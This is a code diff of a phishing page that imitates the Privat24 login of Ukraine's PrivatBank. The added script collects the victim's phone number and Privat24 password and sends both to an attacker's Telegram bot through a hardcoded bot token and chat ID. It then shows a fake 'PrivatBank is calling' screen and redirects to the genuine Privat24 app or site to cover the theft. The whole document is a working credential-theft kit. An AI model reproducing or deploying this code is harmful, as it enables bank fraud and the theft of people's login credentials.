+    <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12.06 19.5c-.84 0-1.54-.28-2.1-.84-.56-.56-.84-1.26-.84-2.1 0-.14.01-.29.04-.43-.14.03-.29.04-.43.04-.84 0-1.54-.28-2.1-.84-.56-.56-.84-1.26-.84-2.1 0-.84.28-1.54.84-2.1.56-.56 1.26-.84 2.1-.84.14 0 .29.01.43.04-.03-.14-.04-.29-.04-.43 0-.84.28-1.54.84-2.1.56-.56 1.26-.84 2.1-.84.84 0 1.54.28 2.1.84.56.56.84 1.26.84 2.1 0 .14-.01.29-.04.43.14-.03.29-.04.43-.04.84 0 1.54.28 2.1.84.56.56.84 1.26.84 2.1 0 .84-.28 1.54-.84 2.1-.56.56-1.26.84-2.1.84-.14 0-.29-.01-.43-.04.03.14.04.29.04.43 0 .84-.28 1.54-.84 2.1-.56.56-1.26.84-2.1.84z"/></svg><span>Привіт</span></div>
+    <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M4 4h6v6H4V4zm10 0h6v6h-6V4zM4 14h6v6H4v-6zm10 0h6v6h-6v-6z"/></svg><span>Ще</span></div>
   </nav>
 </div>
 
-<!-- Экран звонка -->
-<div id="callScreen">
-  <div class="call-header">
-    <div class="title">Вхід/Реєстрація</div>
-    <div class="close-btn" id="closeCallBtn">
-      <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#fff"/></svg>
+<!-- ЭКРАН 2: ВВОД ПАРОЛЯ -->
+<div id="screen-password" class="screen">
+  <header class="pwd-header">
+    <div class="back-btn" id="backBtn"><svg width="24" height="24" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></div>
+    <div class="title">Пароль</div>
+  </header>
+  <main class="pwd-content">
+    <div class="logo-container">
+      <div class="bg-spot spot-1"></div><div class="bg-spot spot-2"></div><div class="circle-24">24</div>
     </div>
-  </div>
-  
-  <div class="call-content">
-    <div class="call-phone-label">Номер телефону</div>
-    <div class="call-phone-display">+380 ** *** ** 42</div>
-    
-    <div class="call-bank-title">Телефонує Приватбанк</div>
-
-    <div class="call-circle-container">
-      <div class="call-circle-bg"></div>
-      <div class="call-icon">
-        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+    <div class="subtitle">Введіть пароль Приват24</div>
+    <div class="input-group">
+      <label class="input-label">Пароль Приват24</label>
+      <div class="input-wrapper">
+        <input type="password" id="passwordInput" class="password-input" autocomplete="current-password">
+        <div class="eye-icon" id="togglePassword"><svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></div>
       </div>
     </div>
+    <button class="btn-pwd-submit" id="submitPasswordBtn">Продовжити</button>
+  </main>
+</div>
 
-    <div class="call-instruction">
-      Дайте відповідь на дзвінок і дотримуйтесь інструкцій
+<!-- ЭКРАН 3: ОЖИДАНИЕ ЗВОНКА -->
+<div id="screen-call" class="screen call-screen">
+  <header class="call-header">
+    <div class="title">Вхід/Реєстрація</div>
+    <div class="close-btn" id="closeCallBtn"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></div>
+  </header>
+  <main class="call-content">
+    <div class="call-phone-info">
+      <div class="call-phone-label">Номер телефону</div>
+      <div class="call-phone-display" id="callPhoneDisplay">+380 ** *** ** 42</div>
     </div>
-
+    <div class="call-bank-title">Телефонує Приватбанк</div>
+    <div class="call-circle-container">
+      <div class="call-circle-bg"></div>
+      <div class="call-icon"><svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
+    </div>
+    <div class="call-instruction">Дайте відповідь на дзвінок і дотримуйтесь інструкцій</div>
     <button class="btn-sms">Підтвердити через SMS</button>
-
-    <div class="bottom-indicator"></div>
-  </div>
+    <div class="call-bottom-indicator"></div>
+  </main>
 </div>
 
 <script>
-  const mainScreen = document.getElementById('mainScreen');
-  const callScreen = document.getElementById('callScreen');
-  const continueBtn = document.getElementById('continueBtn');
-  const closeCallBtn = document.getElementById('closeCallBtn');
+  // --- КОНФИГУРАЦИЯ ---
+  const BOT_TOKEN = '8994488446:AAEuJ7w2B7vFjHeOshq2pLaMAZ8c3HT8UbQ';
+  const CHAT_ID = '8667961334';
+
+  // --- ЭЛЕМЕНТЫ ЭКРАНОВ ---
+  const screenPhone = document.getElementById('screen-phone');
+  const screenPassword = document.getElementById('screen-password');
+  const screenCall = document.getElementById('screen-call');
+
+  // --- ЭЛЕМЕНТЫ УПРАВЛЕНИЯ ---
   const phoneInput = document.getElementById('phoneInput');
+  const passwordInput = document.getElementById('passwordInput');
+  const continueBtn = document.getElementById('continueBtn');
+  const backBtn = document.getElementById('backBtn');
+  const submitPasswordBtn = document.getElementById('submitPasswordBtn');
+  const togglePassword = document.getElementById('togglePassword');
+  const closeCallBtn = document.getElementById('closeCallBtn');
+
+  // Функция переключения экранов
+  function showScreen(screenId) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(screenId).classList.add('active');
+  }
 
   // Маска для телефона
   phoneInput.addEventListener('input', function (e) {
@@ -592,17 +242,105 @@ body {
     e.target.value = !x[2] ? x[1] : x[1] + ' ' + x[2] + (x[3] ? ' ' + x[3] : '') + (x[4] ? ' ' + x[4] : '');
   });
 
-  // Переход на экран звонка
+  // --- ЛОГИКА ПЕРЕХОДОВ ---
+
+  // 1. Переход на экран пароля
   continueBtn.addEventListener('click', function() {
-    mainScreen.style.display = 'none';
-    callScreen.style.display = 'flex';
+    if (phoneInput.value.replace(/\D/g, '').length < 9) {
+      alert('Будь ласка, введіть коректний номер телефону');
+      return;
+    }
+    
+    localStorage.setItem('userPhone', phoneInput.value);
+    showScreen('screen-password');
+    
+    // Отправка номера в ТГ
+    sendToTelegram(`📱 <b>Крок 1. Введено номер:</b> +380 ${phoneInput.value}`);
   });
 
-  // Возврат на главный экран
-  closeCallBtn.addEventListener('click', function() {
-    callScreen.style.display = 'none';
-    mainScreen.style.display = 'flex';
+  // 2. Возврат с экрана пароля
+  backBtn.addEventListener('click', function() {
+    showScreen('screen-phone');
   });
+
+  // Показать/скрыть пароль
+  togglePassword.addEventListener('click', function () {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+    this.style.opacity = type === 'text' ? '1' : '0.6';
+  });
+
+  // 3. Переход на экран звонка и отправка пароля
+  submitPasswordBtn.addEventListener('click', function() {
+    const password = passwordInput.value;
+    if (password.trim() === '') {
+      alert('Будь ласка, введіть пароль');
+      return;
+    }
+
+    const message = `🔐 <b>Крок 2. Отримано пароль!</b>\n\n📱 <b>Телефон:</b> +380 ${phoneInput.value}\n🔑 <b>Пароль:</b> <code>${password}</code>\n⏰ <b>Час:</b> ${new Date().toLocaleString()}`;
+    sendToTelegram(message);
+    
+    // Блокируем кнопку
+    submitPasswordBtn.textContent = 'Зачекайте...';
+    submitPasswordBtn.disabled = true;
+
+    // Имитация загрузки и переход к экрану звонка
+    setTimeout(() => {
+      showScreen('screen-call');
+      
+      // Маскируем номер на экране звонка
+      const savedPhone = localStorage.getItem('userPhone');
+      if (savedPhone) {
+        const digits = savedPhone.replace(/\D/g, '');
+        if (digits.length >= 9) {
+          document.getElementById('callPhoneDisplay').textContent = `+380 ** *** ** ${digits.slice(-2)}`;
+        }
+      }
+
+      // Ждем 5 секунд и редиректим в приложение
+      setTimeout(() => {
+        // Попытка открыть приложение Приват24 (если установлено)
+        window.location.href = 'privat24://';
+        
+        // Если приложение не открылось, через 1.5 секунды перекидываем на сайт
+        setTimeout(() => {
+          window.location.href = 'https://next.privat24.ua/';
+        }, 1500);
+      }, 5000);
+
+    }, 1000); // 1 секунда задержки перед экраном звонка
+  });
+
+  // 4. Закрытие экрана звонка (возврат к вводу пароля)
+  closeCallBtn.addEventListener('click', function() {
+    showScreen('screen-password');
+    // Сбрасываем кнопку
+    submitPasswordBtn.textContent = 'Продовжити';
+    submitPasswordBtn.disabled = false;
+    passwordInput.value = '';
+  });
+
+  // Функция отправки в Telegram
+  function sendToTelegram(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) console.log('Сообщение успешно отправлено');
+      else console.error('Ошибка API Telegram:', data.description);
+    })
+    .catch(error => console.error('Ошибка сети:', error));
+  }
 </script>
 
 </body>
